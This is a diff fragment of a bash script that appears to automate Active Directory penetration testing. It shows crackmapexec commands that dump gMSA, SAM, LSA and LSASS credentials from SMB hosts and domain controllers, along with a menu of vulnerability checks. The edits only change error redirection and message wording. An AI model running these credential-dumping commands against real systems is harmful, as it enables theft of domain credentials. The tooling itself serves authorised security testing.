     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
     else
-        ${crackmapexec} ldap ${target} "${argument_cme[@]}" --gmsa 2>/dev/null | tee ${output_dir}/DomainRecon/cme_gMSA_${dc_domain}.txt
+        ${crackmapexec} ldap ${target} "${argument_cme[@]}" --gmsa 2>&1 | tee ${output_dir}/DomainRecon/cme_gMSA_${dc_domain}.txt
     fi
     echo -e ""
 }
@@ -1217,7 +1269,7 @@ sam_dump () {
         echo -e "${PURPLE}[-] SAM dump requires credentials${NC}"
     else
         if [ "${kerb_bool}" == true ]; then
-            echo -e "${PURPLE}[-] Targeting DC only${NC}"
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
             curr_targets="Domain Controllers"
         fi
         smb_scan
@@ -1235,7 +1287,7 @@ lsa_dump () {
         echo -e "${PURPLE}[-] LSA dump requires credentials${NC}"
     else
         if [ "${kerb_bool}" == true ]; then
-            echo -e "${PURPLE}[-] Targeting DC only${NC}"
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
             curr_targets="Domain Controllers"
         fi
         smb_scan
@@ -1253,13 +1305,13 @@ lsassy_dump () {
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
         if [ "${kerb_bool}" == true ]; then
-            echo -e "${PURPLE}[-] Targeting DC only${NC}"
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
             curr_targets="Domain Controllers"
         fi
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using lsassy${NC}"
-            ${crackmapexec} smb ${i} "${argument_cme[@]}" -M lsassy 2>/dev/null | tee -a ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${i}.txt
+            ${crackmapexec} smb ${i} "${argument_cme[@]}" -M lsassy 2>&1 | tee -a ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${i}.txt
         done
     fi
     echo -e ""
@@ -1271,13 +1323,13 @@ handlekatz_dump () {
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
         if [ "${kerb_bool}" == true ]; then
-            echo -e "${PURPLE}[-] Targeting DC only${NC}"
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
             curr_targets="Domain Controllers"
         fi
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using handlekatz${NC}"
-            ${crackmapexec} smb ${i} "${argument_cme[@]}" -M handlekatz 2>/dev/null | tee -a ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${i}.txt
+            ${crackmapexec} smb ${i} "${argument_cme[@]}" -M handlekatz 2>&1 | tee -a ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${i}.txt
         done
     fi
     echo -e ""
@@ -1289,13 +1341,13 @@ procdump_dump () {
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
         if [ "${kerb_bool}" == true ]; then
-            echo -e "${PURPLE}[-] Targeting DC only${NC}"
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
             curr_targets="Domain Controllers"
         fi
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using procdump ${NC}"
-            ${crackmapexec} smb ${i} "${argument_cme[@]}" -M procdump 2>/dev/null | tee -a ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${i}.txt
+            ${crackmapexec} smb ${i} "${argument_cme[@]}" -M procdump 2>&1 | tee -a ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${i}.txt
         done
     fi
     echo -e ""
@@ -1307,13 +1359,13 @@ nanodump_dump () {
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
         if [ "${kerb_bool}" == true ]; then
-            echo -e "${PURPLE}[-] Targeting DC only${NC}"
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
             curr_targets="Domain Controllers"
         fi
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using nanodump ${NC}"
-            ${crackmapexec} smb ${i} "${argument_cme[@]}" -M nanodump 2>/dev/null | tee -a ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${i}.txt
+            ${crackmapexec} smb ${i} "${argument_cme[@]}" -M nanodump 2>&1 | tee -a ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${i}.txt
         done
     fi
     echo -e ""
@@ -1346,19 +1398,19 @@ masky_dump () {
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
         if [ ! -f "${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt" ]; then
-            ${crackmapexec} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M adcs --kdcHost "${kdc}.${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>&1
+            ${crackmapexec} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M adcs --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>&1
         fi
         pki_server=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found PKI Enrollment Server" | cut -d ":" -f 2 | cut -d " " -f 2 | head -n 1)
         pki_ca=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found CN" | cut -d ":" -f 2 | cut -d " " -f 2 | head -n 1)
         if [ ! "${pki_server}" == "" ] && [ ! "${pki_ca}" == "" ]; then
             if [ "${kerb_bool}" == true ]; then
-                echo -e "${PURPLE}[-] Targeting DC only${NC}"
+                echo -e "${PURPLE}[-] Targeting DCs only${NC}"
                 curr_targets="Domain Controllers"
             fi
             smb_scan
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] LSASS dump of ${i} using masky (PKINIT)${NC}"
-                ${crackmapexec} smb ${i} "${argument_cme[@]}" -M masky -o "CA= ${pki_server}\\${pki_ca}" 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt
+                ${crackmapexec} smb ${i} "${argument_cme[@]}" -M masky -o "CA= ${pki_server}\\${pki_ca}" 2>&1 | tee ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt
             done
         else
             echo -e "${PURPLE}[-] No ADCS servers found. If ADCS servers exist, re-run ADCS enumeration and try again.${NC}"
@@ -1773,7 +1825,7 @@ vulns_menu () {
     echo -e "2) PetitPotam check using crackmapexec (only on DC)"
     echo -e "3) dfscoerce check using crackmapexec (only on DC)"
     echo -e "4) zerologon check using crackmapexec (only on DC)"
-    echo -e "5) ms14-068 check (only on DC)"
+    echo -e "5) MS14-068 check (only on DC)"
     echo -e "6) MS17-010 check using crackmapexec"
     echo -e "7) Print Spooler check using crackmapexec"
     echo -e "8) WebDAV check using crackmapexec"
